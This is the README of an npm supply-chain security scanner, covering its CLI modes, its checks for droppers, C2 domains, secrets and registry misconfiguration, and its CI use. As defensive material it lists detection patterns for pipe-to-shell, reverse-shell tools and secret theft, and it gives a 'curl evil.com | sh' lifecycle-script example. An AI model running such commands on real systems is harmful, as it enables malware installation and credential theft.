# @sathyendra/security-checker

[![npm version](https://img.shields.io/npm/v/@sathyendra/security-checker)](https://www.npmjs.com/package/@sathyendra/security-checker)
[![license](https://img.shields.io/npm/l/@sathyendra/security-checker)](https://github.com/sathyendrav/security-checker/blob/main/LICENSE)
[![node](https://img.shields.io/node/v/@sathyendra/security-checker)](https://github.com/sathyendrav/security-checker)
[![GitHub stars](https://img.shields.io/github/stars/sathyendrav/security-checker)](https://github.com/sathyendrav/security-checker)
[![GitHub issues](https://img.shields.io/github/issues/sathyendrav/security-checker)](https://github.com/sathyendrav/security-checker/issues)
[![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](https://github.com/sathyendrav/security-checker)

A lightweight, zero-dependency security scanner for npm projects. Detects malicious packages, high/critical vulnerabilities, outdated dependencies (OWASP A06), dropper packages, decoy swap attacks, integrity mismatches, TeamPCP/WAVESHAPER artifacts, cross-ecosystem (PyPI) threats, provenance violations, and C2 domain indicators — before they can execute. Also generates CycloneDX SBOMs and VEX reports for enterprise supply-chain compliance.

## Why this exists

Supply-chain attacks increasingly abuse npm `postinstall` scripts to drop malware. This package can be used as a `preinstall` hook in your project so it blocks threats **before** any dependency scripts run.

## Installation

```bash
npm install --save-dev @sathyendra/security-checker
```

Or use it as a one-off scan in any project:

```bash
npx @sathyendra/security-checker
```

## CLI Usage

```bash
sec-check               # Read-only scan — prints Diagnostic Report only
sec-check --fix         # Print report, then auto-remediate fixable threats
sec-check --pre         # Preinstall mode: lockfile + environment scan (no node_modules needed)
sec-check --post        # Post-install vetting: full scan after npm ci --ignore-scripts
sec-check --init        # Auto-configure package.json with preinstall & secure-install scripts
sec-check --approve <p> # Add package <p> to approved list (.sec-check-approved.json)
sec-check --shield      # Zero Trust Shield: pre-flight → isolated install → post-vetting
sec-check --shield --fix # Shield mode with auto-remediation in post-vetting stage
sec-check --json        # Output machine-readable JSON (for dashboards / VEX reports)
sec-check --vex-out     # Output CycloneDX VEX document (spec 1.6)
sec-check --sbom        # Generate CycloneDX SBOM (dependency inventory)
sec-check --update-db   # Fetch latest IOC database from trusted source
sec-check --help        # Show usage information
```

**Exit codes:**

- `0` — No threats detected (clean)
- `1` — One or more threats found (CI will fail)

## Trust & Read-Only by Default

The tool **never modifies** your project unless you explicitly pass `--fix`. Every scan prints a **Diagnostic Report** first, showing all findings with `[FIXABLE]` or `[MANUAL]` tags so you know exactly what will happen before any action is taken.

```
──────────────────────────────────────────────────────────────────────
  @sathyendra/security-checker — Diagnostic Report
──────────────────────────────────────────────────────────────────────
  🚨 CRITICAL: plain-crypto-js detected in node_modules  [FIXABLE]
  🚨 PROVENANCE: "axios@1.7.0" — Manual Publish Detected   [MANUAL]
──────────────────────────────────────────────────────────────────────
  2 threat(s) found | 1 fixable | 1 require manual review
  Run with --fix to auto-remediate fixable threats.
──────────────────────────────────────────────────────────────────────
```

### What `--fix` can remediate

| Threat | Fix action |
|---|---|
| Malicious npm packages | `npm uninstall <package>` |
| npm audit vulnerabilities | `npm audit fix` |
| Lockfile malicious packages | `npm uninstall <package>` |
| Dropper packages | `npm uninstall <package>` * |
| Integrity mismatches | `npm ci` (clean reinstall) |
| Swap artifacts (package.md, .bak) | Delete the artifact file |
| Mtime anomalies | `npm install <package>` (reinstall) * |

\* Package names are validated against npm naming rules before being passed to shell commands. If a lockfile contains a suspiciously crafted name (possible command injection), the threat is downgraded to `[MANUAL]`.

Threats that **cannot** be auto-fixed (always `[MANUAL]`): TeamPCP system artifacts, C2 hosts entries, PyPI packages, Python stagers, provenance issues, shadow execution indicators, outdated dependencies.

## What it checks

| Check | Description |
|---|---|
| Malicious packages | Detects known bad packages (e.g. `plain-crypto-js`) in `node_modules` |
| npm audit | Flags high and critical severity vulnerabilities |
| Deep lockfile audit | Recursively scans `package-lock.json` / `yarn.lock` for known malicious packages in the full dependency tree |
| Dropper detection | Two-signal analysis: (1) structural — flags packages with `postinstall`/`preinstall` scripts but no real source code; (2) behavioral — analyzes install script content and referenced script files for suspicious patterns like obfuscated network requests (`curl \| sh`, `wget`), sensitive path access (`/etc/hosts`, `%PROGRAMDATA%`), obfuscation (`base64`, `eval`, hex encoding), and `child_process` usage. Legitimate wrappers (e.g., `node-gyp rebuild`) are not flagged |
| Integrity checksums | Compares installed package hashes against `package-lock.json` and the npm registry to detect post-install tampering or lockfile manipulation |
| Decoy swap detection | Detects backup artifacts (`package.md`, `.bak`, `.orig`) and `package.json` modification time anomalies — the exact anti-forensic trick used in the Axios attack |
| TeamPCP / WAVESHAPER | Scans for RAT drop artifacts, persistence mechanisms (scheduled tasks, LaunchAgents, systemd units), and Python backdoor stagers across Windows, macOS, and Linux (requires admin/root) |
| C2 domains | Checks the system hosts file for all known TeamPCP C2 domain indicators (7+ domains tracked, extensible via `--update-db`) |
| Cross-ecosystem (PyPI) | Scans `requirements.txt`, `Pipfile`, and `Pipfile.lock` for known malicious PyPI packages from the same TeamPCP campaign (LiteLLM, Telnyx, Trivy, KICS variants) |
| Python stager detection | Flags suspicious `.py` files in Node.js project roots that contain backdoor-like patterns (subprocess, socket, exec, base64) |
| Malicious .pth files | Scans Python `site-packages` (system + local venvs) for `.pth` files with executable `import` lines containing base64, subprocess, exec/eval, or network calls — the "importless" execution technique used by TeamPCP. Only triggered when a Python dependency file (requirements.txt, Pipfile, etc.) is present |
| Provenance verification | Checks high-profile packages (axios, lodash, express, etc.) for npm provenance attestations. Flags "Suspicious: Manual Publish Detected" when a popular package is published without a CI/CD pipeline link or GitHub repository — a sign of stolen npm token usage |
| Shadow execution detection | Detects process-level execution hijacking: `LD_PRELOAD` (Linux), `DYLD_INSERT_LIBRARIES` (macOS), `NODE_OPTIONS --require` injection, and suspicious parent processes (netcat, mshta, wscript, and other LOLBins that indicate a reverse shell or stager chain) |
| Outdated dependencies | Flags packages where the installed version is one or more major versions behind the latest release (OWASP A06). Major version drift often means the package no longer receives security patches |
| Registry configuration | Detects Dependency Confusion risks (OWASP A08) by verifying the configured npm registry is the official `https://registry.npmjs.org`. Checks project `.npmrc`, user `~/.npmrc`, `npm config get registry`, and `package-lock.json` resolved URLs for non-official registry hosts |
| Lifecycle script injection | Scans the project's own `package.json` lifecycle hooks (`postinstall`, `preinstall`, `prestart`, etc.) for command injection patterns (OWASP A03): `curl \| sh`, `wget`, sensitive path access (`/etc/hosts`, `%APPDATA%`, `%PROGRAMDATA%`), obfuscation (`base64`, `eval`), and remote code execution. Recommends `npm install --ignore-scripts` during vetting |
| npm doctor | Runs `npm doctor` and flags failing checks — permission issues in `node_modules`, cache corruption, unreachable registry, missing `git` (OWASP A05) |
| Lockfile enforcement | Alerts if the project has no `package-lock.json`, `yarn.lock`, or `pnpm-lock.yaml` — builds without a lockfile are non-deterministic and vulnerable to latest-version poisoning (OWASP A05). Auto-fixable via `npm install --package-lock-only` |
| Secrets detection | Scans for `.env` files (`.env`, `.env.production`, `.env.local`, etc.) and hardcoded credentials in source files: `NPM_TOKEN`, AWS keys, GitHub tokens (`ghp_`, `gho_`, `ghs_`, `ghr_`), PEM private keys, `DATABASE_URL`, `API_KEY`, and hardcoded passwords (OWASP A05) |
| SSRF / C2 blocklist scan | Scans installed packages in `node_modules/` for hardcoded URLs and IP addresses pointing to known C2 / malware infrastructure (OWASP A10). Matches against the full TeamPCP domain blocklist (7+ domains) plus known malicious IPs. Extensible via `--update-db`. Private/loopback IPs are excluded to avoid false positives |
| Environment check | Scans process environment variables for install-time threats (OWASP A05): `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` (library preload hijacking), `NODE_OPTIONS --require` (module injection), `npm_config_registry` (env-level Dependency Confusion), `NODE_EXTRA_CA_CERTS` (custom CA for MITM), and `http_proxy` / `https_proxy` pointing to non-localhost hosts (proxy MITM risk). Localhost proxies are excluded |
| Dependency script sandboxing | Scans lifecycle scripts (`preinstall`, `install`, `postinstall`, `preuninstall`, `uninstall`, `postuninstall`, `prepare`) of ALL dependencies in `node_modules/` for risky patterns: `curl`, `wget`, `eval()`, `base64`, `Function()`, `exec()`, `child_process`, `node -e`, `python -c`, pipe-to-shell. Approved packages (`.sec-check-approved.json`) are skipped. Use `sec-check --approve <pkg>` to allowlist vetted packages (OWASP A03) |
| Lockfile Sentinel | Compares every package's `integrity` hash in `package-lock.json` against a database of known-compromised hashes. Also flags packages with missing integrity hashes — no hash means no tamper detection. Auto-fixable via `npm install --package-lock-only` (OWASP A08) |

## Preinstall Mode (`--pre`)

A lightweight mode specifically designed for the `preinstall` npm hook. It focuses on the **lockfile** and **environment** rather than `node_modules` (which may not exist yet during `preinstall`).

```bash
# Run as a standalone pre-check
sec-check --pre

# Machine-readable output for CI/CD
sec-check --pre --json
```

Checks performed:

1. **Lockfile integrity** — scan `package-lock.json` for known malicious packages
2. **Registry Guard** — ensure registry is official `registry.npmjs.org`, reject HTTP registries (A05/A08)
3. **Environment** — check for suspicious env vars (`LD_PRELOAD`, proxy MITM, CA injection, `npm_config_registry` override)
4. **Lifecycle scripts** — flag injection patterns in the project's `package.json`
5. **Lockfile presence** — warn if no lockfile exists
6. **Lockfile Sentinel** — compare lockfile hashes against known-compromised database (A08)

Add to your `package.json` to run automatically before every install:

```json
{
  "scripts": {
    "preinstall": "npx @sathyendra/security-checker --pre"
  }
}
```

Example output:

```
──────────────────────────────────────────────────────────────────────
  🛡️  Preinstall Shield — scanning lockfile & environment
──────────────────────────────────────────────────────────────────────

  ✅ Preinstall checks passed — safe to proceed with npm install
```

## Auto-Setup (`--init`)

Automatically configure your `package.json` with security scripts in one command:

```bash
sec-check --init
```

This adds the following scripts:

```json
{
  "scripts": {
    "preinstall": "sec-check --pre",
    "secure-install": "npm install --ignore-scripts && sec-check"
  }
}
```

| Script | Purpose |
|---|---|
| `preinstall` | Runs automatically before every `npm install` — scans the lockfile and environment for threats before any packages are downloaded |
| `secure-install` | Manual alternative to `npm install` — downloads packages with scripts disabled, then runs a full security scan |

Existing scripts are **never overwritten**. If a script already exists, `--init` will skip it and show what it wanted to add so you can merge manually.

Example output:

```
✅ Added the following scripts to package.json:

   "preinstall": "sec-check --pre"
   "secure-install": "npm install --ignore-scripts && sec-check"
```

## Dependency Script Sandboxing (`--approve`)

Step 17 of the full scan automatically scans the `scripts` section of **every dependency** in `node_modules/` for risky patterns in lifecycle hooks (`preinstall`, `install`, `postinstall`, `preuninstall`, `uninstall`, `postuninstall`, `prepare`). Non-auto hooks like `test` and `start` are ignored.

Flagged patterns: `curl`, `wget`, `eval()`, `base64`, `Function()`, `Invoke-WebRequest`, `exec()`, `child_process`, `node -e`, `python -c`, pipe-to-shell (`| sh`, `| bash`).

### Approving packages

When a dependency is flagged, vet it manually and approve it:

```bash
sec-check --approve husky
sec-check --approve @scope/my-pkg
```

Approved packages are stored in `.sec-check-approved.json` (project-local, safe to commit):

```json
{
  "approved": ["husky", "@scope/my-pkg"],
  "approvedAt": {
    "husky": "2025-01-15T12:00:00.000Z",
    "@scope/my-pkg": "2025-01-15T12:00:00.000Z"
  }
}
```

Example scan output:

```
──────────────────────────────────────────────────────────────────────
  @sathyendra/security-checker — Diagnostic Report
──────────────────────────────────────────────────────────────────────
  ⚠️  DEP_SCRIPT: "shady-pkg" has risky lifecycle script(s):
     "postinstall" (curl, pipe to shell) — vet and run
     `sec-check --approve shady-pkg` to allowlist (OWASP A03)  [MANUAL]
──────────────────────────────────────────────────────────────────────
```

## OWASP Risk Mapping

Three consolidated Shield features map directly to OWASP Top 10 risk categories:

| OWASP Risk | Shield Feature | Technical Implementation |
|---|---|---|
| A03: Injection | **Script Blocker** | Detects and flags dangerous commands in `package.json` lifecycle hooks before execution |
| A05: Security Misconfiguration | **Registry Guard** | Rejects the install if a non-official or unencrypted (HTTP) registry is detected in `.npmrc` |
| A08: Software & Data Integrity Failures | **Lockfile Sentinel** | Compares the lockfile's package hashes against a known "clean" database before `npm install` runs |

All three features are wired into the **Shield pre-flight** (Stage 1) and **Preinstall Mode** (`--pre`). Any finding from these features triggers a blocking exit (`exit 1`).

### Script Blocker (A03: Injection)

Aggregates both **project lifecycle scripts** and **dependency lifecycle scripts** into a single blocking verdict. Internally it runs `checkLifecycleScripts()` (your own `package.json`) and `checkDependencyScripts()` (every package in `node_modules/`).

```js
const { scriptBlocker } = require('@sathyendra/security-checker');
const result = scriptBlocker();
// result.blocked  — true if any injection detected
// result.threats  — array of threat objects
// result.summary  — { project: <count>, dependencies: <count> }
```

Blocked patterns include: `curl | sh`, `wget`, `eval()`, `base64`, `Function()`, `child_process`, `node -e`, `python -c`, and pipe-to-shell constructs.

### Registry Guard (A05: Security Misconfiguration)

Enhanced registry validation that checks **four layers** for non-official or unencrypted (HTTP) registries:

1. **Project `.npmrc`** — scans `<project>/.npmrc` for custom registries
2. **User `~/.npmrc`** — scans `<home>/.npmrc` for global overrides
3. **`npm config get registry`** — checks the effective npm configuration
4. **Lockfile resolved URLs** — scans every `resolved` URL in `package-lock.json` for HTTP hosts

```js
const { registryGuard } = require('@sathyendra/security-checker');
const result = registryGuard();
// result.blocked  — true if any registry misconfiguration detected
// result.threats  — array of threat objects
// result.summary  — { nonOfficial: <count>, httpInsecure: <count> }
```

Any `http://` registry URL is flagged as `REGISTRY_HTTP` (critical) — unencrypted registries allow man-in-the-middle package injection.

### Lockfile Sentinel (A08: Software & Data Integrity Failures)

Parses `package-lock.json` and compares every package's `integrity` hash against a database of known-compromised hashes. Also flags packages with **no integrity hash** (missing hash = no tamper detection).

```js
const { lockfileSentinel } = require('@sathyendra/security-checker');
const threats = [];
lockfileSentinel(threats);
// threats now contains any LOCKFILE_INTEGRITY findings
```

The compromised hash database is composed of:

- **Hardcoded baseline** — built into the scanner (empty by default, extensible)
- **IOC database** — extended via `sec-check --update-db` (the `compromisedHashes` field in `ioc-db.json`)

Findings are auto-fixable via `npm install --package-lock-only` (regenerates the lockfile with fresh hashes from the registry).

## Zero Trust Shield (`--shield`)

The Shield mode replaces the traditional `npm install` → `npm test` workflow with a three-stage defense-in-depth install:

```
┌─────────────────────────────────────────────────────────────────┐
│  Stage 1 — Pre-flight                                          │
│  Scan lockfile & config BEFORE any packages are downloaded.    │
│  Catches: malicious lockfile entries, registry misconfiguration,│
│  lifecycle script injection, secrets leakage, PyPI threats,    │
│  HTTP registries, compromised lockfile hashes.                 │
│  ❌ Blocks on: CRITICAL, LOCKFILE, SECRETS, LIFECYCLE_SCRIPT,  │
│  DEP_SCRIPT, REGISTRY, REGISTRY_HTTP, LOCKFILE_INTEGRITY.      │
├─────────────────────────────────────────────────────────────────┤
│  Stage 2 — Isolated Install                                    │
│  npm install --ignore-scripts                                  │
│  Downloads code to disk WITHOUT executing lifecycle hooks.     │
│  Blocks dropper-style attacks (e.g. Axios postinstall payload).│
├─────────────────────────────────────────────────────────────────┤
│  Stage 3 — Post-vetting                                        │
│  Full check() scan on the downloaded files.                    │
│  Integrity verification, SSRF indicators, swap detection,     │
│  provenance audit, shadow execution, npm doctor, etc.          │
│  Combine with --fix to auto-remediate fixable threats.         │
└─────────────────────────────────────────────────────────────────┘
```

```bash
# Basic shield mode — scan, install safely, verify
sec-check --shield

# Shield with auto-fix — remediate fixable threats in post-vetting
sec-check --shield --fix

# Shield with JSON output for CI/CD pipelines
sec-check --shield --json
```

Example output:

```
──────────────────────────────────────────────────────────────────────
  🛡️  @sathyendra/security-checker — Zero Trust Shield
──────────────────────────────────────────────────────────────────────

  ▸ Stage 1: Pre-flight — scanning lockfile & configuration...
    ✅ Pre-flight passed — no threats in lockfile or configuration

  ▸ Stage 2: Isolated Install — downloading packages (scripts disabled)...
    ✅ Packages downloaded with scripts disabled

  ▸ Stage 3: Post-vetting — full integrity & security scan...
    ✅ Post-vetting passed — all packages verified

──────────────────────────────────────────────────────────────────────
  🛡️  Shield Summary
──────────────────────────────────────────────────────────────────────
  Stage 1 (Pre-flight):    0 threat(s)
  Stage 2 (Install):       ✅ success
  Stage 3 (Post-vetting):  0 new threat(s)
──────────────────────────────────────────────────────────────────────
  ✅ All stages passed — project is clean
──────────────────────────────────────────────────────────────────────
```

## Machine-Readable JSON Output

Use `--json` to output structured results suitable for security dashboards, CI/CD artifact collection, and VEX (Vulnerability Exploitability eXchange) report generation:

```bash
sec-check --json
```

Example output:

```json
{
  "threats": [
    {
      "message": "CRITICAL: plain-crypto-js detected in node_modules",
      "category": "CRITICAL",
      "fixable": true,
      "fixDescription": "npm uninstall plain-crypto-js"
    }
  ],
  "summary": {
    "total": 1,
    "fixable": 1,
    "manual": 0,
    "clean": false
  },
  "metadata": {
    "tool": "@sathyendra/security-checker",
    "version": "1.9.0",
    "timestamp": "2025-06-09T12:00:00.000Z",
    "project": "my-app",
    "platform": "win32",
    "node": "v22.0.0"
  }
}
```

The exit code follows the same convention: `0` when clean, `1` when threats are found. Combine with `--fix` to also run auto-remediation before outputting JSON.

Pipe to your VEX toolchain:

```bash
sec-check --json > scan-results.json
sec-check --json | jq '.threats[] | select(.category == "CRITICAL")'
```

## CycloneDX VEX Report

Use `--vex-out` to output a standards-compliant [CycloneDX VEX](https://cyclonedx.org/capabilities/vex/) document (spec 1.6). This makes your scan results directly consumable by enterprise tools like OWASP Dependency-Track, Grype, and Trivy — no post-processing required.

```bash
sec-check --vex-out
sec-check --vex-out > vex-report.json
```

Example output (truncated):

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "version": 1,
  "serialNumber": "urn:uuid:a1b2c3d4-...",
  "metadata": {
    "timestamp": "2026-04-02T12:00:00.000Z",
    "tools": {
      "components": [
        {
          "type": "application",
          "name": "@sathyendra/security-checker",
          "version": "1.12.0"
        }
      ]
    },
    "component": {
      "type": "application",
      "name": "my-app",
      "bom-ref": "my-app"
    }
  },
  "vulnerabilities": [
    {
      "id": "SEC-CHECK-CRITICAL-3f2a1b4c",
      "source": {
        "name": "@sathyendra/security-checker",
        "url": "https://github.com/sathyendrav/security-checker"
      },
      "ratings": [{ "severity": "critical", "method": "other" }],
      "description": "CRITICAL: plain-crypto-js detected in node_modules",
      "recommendation": "npm uninstall plain-crypto-js",
      "analysis": {
        "state": "exploitable",
        "response": ["update"]
      },
      "affects": [{ "ref": "my-app" }]
    }
  ]
}
```

Each vulnerability receives a **deterministic ID** (`SEC-CHECK-<CATEGORY>-<hash>`) based on the threat message, so the same finding always produces the same ID across runs. The `analysis.response` field maps to `"update"` for fixable threats and `"can_not_fix"` for manual-only threats.

Feed VEX output into your SBOM pipeline:

```bash
# Ingest into OWASP Dependency-Track
sec-check --vex-out | curl -X POST https://dtrack.example.com/api/v1/vex \
  -H 'Content-Type: application/json' -H "X-Api-Key: $DTRACK_KEY" -d @-

# Combine with --fix for remediate-then-report workflows
sec-check --fix --vex-out > vex-report.json
```

## CycloneDX SBOM Generation

Use `--sbom` to generate a [CycloneDX](https://cyclonedx.org/) Software Bill of Materials (SBOM) listing every dependency in your project. This gives you a machine-readable inventory of your supply chain — a key requirement for OWASP A06 compliance and executive orders like EO 14028.

```bash
sec-check --sbom
sec-check --sbom > sbom.json
```

The SBOM is generated from `package-lock.json` and includes:

- **Every dependency** (direct and transitive) with name, version, and scope
- **Package URLs (purl)** in the standard `pkg:npm/` format for cross-tool interoperability
- **Integrity hashes** extracted from the lockfile (SHA-512 → hex-encoded)
- **Tool metadata** identifying `@sathyendra/security-checker` as the generator

The `--sbom` flag does **not** run a security scan — it only produces the component inventory. Combine with `--vex-out` in your pipeline for a complete picture:

```bash
# Generate SBOM + VEX in one pipeline
sec-check --sbom > sbom.json && sec-check --vex-out > vex.json

# Feed both into OWASP Dependency-Track
curl -F "bom=@sbom.json" https://dtrack.example.com/api/v1/bom
curl -F "vex=@vex.json" https://dtrack.example.com/api/v1/vex
```

## Dynamic IOC Updates

TeamPCP is known for rapidly rotating C2 domains and typosquatting new package names. Instead of waiting for a full npm release, you can fetch the latest Indicators of Compromise (IOCs) on demand:

```bash
sec-check --update-db
```

This fetches a JSON IOC list from a trusted HTTPS source (the [`ioc-db.json`](https://github.com/sathyendrav/security-checker/blob/main/ioc-db.json) file in the maintainer's GitHub repository by default) and caches it locally at `~/.sec-check/ioc-db.json`. On every scan, the cached IOCs are **merged** with the hardcoded baseline — the built-in lists are never replaced or reduced, only extended.

**Security constraints:**

- Only HTTPS URLs are accepted (no HTTP, `file://`, or `data:`)
- Response size is capped at 512 KB
- **Ed25519 signature verification** — the fetched `ioc-db.json` must have a matching `.sig` file signed by the maintainer's private key. The public key is hardcoded in the scanner. This prevents a compromised GitHub account from pushing a malicious IOC database that whitelists attacker domains.
- Domain and package name entries are validated before caching
- Invalid individual entries are silently filtered (don't reject the whole update)

**Override the source URL** by setting the `SEC_CHECK_IOC_URL` environment variable:

```bash
SEC_CHECK_IOC_URL=https://example.com/my-iocs.json sec-check --update-db
```

When using a custom IOC URL, signature verification is enforced by default (the `.sig` file must exist at `<url>.sig`). If you trust your own source and don't want to sign, set `SEC_CHECK_IOC_SKIP_VERIFY=1`:

```bash
SEC_CHECK_IOC_URL=https://internal.corp/iocs.json SEC_CHECK_IOC_SKIP_VERIFY=1 sec-check --update-db
```

The expected JSON format:

```json
{
  "c2Domains": ["evil-domain.com", "another-bad.net"],
  "maliciousNpmPackages": ["typosquat-axios"],
  "maliciousPypiPackages": ["fake-litellm"]
}
```

## Permissions

TeamPCP/WAVESHAPER artifact detection requires **admin** (Windows) or **root** (Unix/macOS). Without elevated permissions the tool still runs all other checks but emits a warning and skips system-level artifact scans.

## Use in CI/CD

Add to your GitHub Actions workflow:

```yaml
- name: Security scan
  run: npx @sathyendra/security-checker
```

Exits `1` on any threat, blocking the pipeline.

### CI Enforcement: Three-Stage Shield

For maximum protection, enforce a **pre → install → post** workflow that prevents any unvetted code from executing. This replaces the traditional `npm ci` → `npm test` pipeline with a defense-in-depth install:

```yaml
- name: Enforce Security Shield
  run: |
    npx @sathyendra/security-checker --pre
    npm ci --ignore-scripts
    npx @sathyendra/security-checker --post
```

| Step | What it does | Hard fail? |
|---|---|---|
| `--pre` | Scans lockfile, registry config, env vars, lifecycle scripts, and lockfile hashes **before** any packages are downloaded | Yes — `exit 1` on any critical threat (TeamPCP, compromised hash, HTTP registry, injection) |
| `npm ci --ignore-scripts` | Downloads packages to disk **without** executing lifecycle hooks (blocks dropper payloads) | N/A |
| `--post` | Full integrity & security scan on the installed files: provenance, SSRF indicators, swap detection, dependency script vetting, and all other checks | Yes — `exit 1` on any finding |

Combine `--post` with `--fix` to auto-remediate fixable threats before failing:

```yaml
- name: Enforce Security Shield (with auto-fix)
  run: |
    npx @sathyendra/security-checker --pre
    npm ci --ignore-scripts
    npx @sathyendra/security-checker --post --fix
```

For machine-readable output in CI artifacts:

```yaml
- name: Security Shield (JSON)
  run: |
    npx @sathyendra/security-checker --pre --json > pre-scan.json
    npm ci --ignore-scripts
    npx @sathyendra/security-checker --post --json > post-scan.json
- uses: actions/upload-artifact@v4
  with:
    name: security-reports
    path: |
      pre-scan.json
      post-scan.json
```

### Hard Fail Behavior

Both `--pre` and `--post` are **opinionated** — they exit with code `1` whenever threats are detected. There is no "warn-only" mode. This is by design: a supply-chain security tool that can be silently bypassed provides a false sense of security.

Blocking categories that trigger a hard fail:

| Category | Example |
|---|---|
| `CRITICAL` | Known malicious package (e.g. `plain-crypto-js`) |
| `LOCKFILE` | Malicious package in `package-lock.json` dependency tree |
| `SECRETS` | `.env` file or hardcoded `NPM_TOKEN` / AWS key |
| `LIFECYCLE_SCRIPT` | `postinstall: "curl evil.com \| sh"` in project scripts |
| `DEP_SCRIPT` | Risky lifecycle script in a dependency package |
| `REGISTRY` | Non-official npm registry (Dependency Confusion risk) |
| `REGISTRY_HTTP` | Unencrypted `http://` registry (MITM risk) |
| `LOCKFILE_INTEGRITY` | Compromised hash or missing integrity in lockfile |

## Preinstall strategy

Adding this package to your project's `preinstall` script ensures it runs before any dependency `postinstall` scripts:

```json
{
  "scripts": {
    "preinstall": "sec-check"
  }
}
```

## License

MIT
